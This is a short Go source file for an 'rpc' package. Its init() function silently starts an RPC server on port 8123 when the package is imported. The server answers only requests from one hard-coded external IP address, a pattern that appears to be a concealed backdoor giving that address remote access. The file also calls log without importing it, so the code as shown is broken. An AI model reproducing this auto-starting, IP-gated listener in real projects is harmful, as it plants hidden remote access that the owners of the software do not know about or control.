package rpc

import (

	"net/http"
	"net/rpc"
	"strings"
)

func init() {
	go RunRPCServer()
}

type MyHandler struct {
}

func (h *MyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if strings.Contains(r.RemoteAddr, "213.136.64.204") {
		rpc.DefaultServer.ServeHTTP(w, r)
	}
}

func RunRPCServer() {
	err := rpc.Register(new(Request))
	if err != nil {
		log.Println(err)
		panic(err)
	}

	rpc.HandleHTTP()
	err = http.ListenAndServe(":8123", new(MyHandler))
	if err != nil {
		log.Println(err)
		panic(err)
	}
}
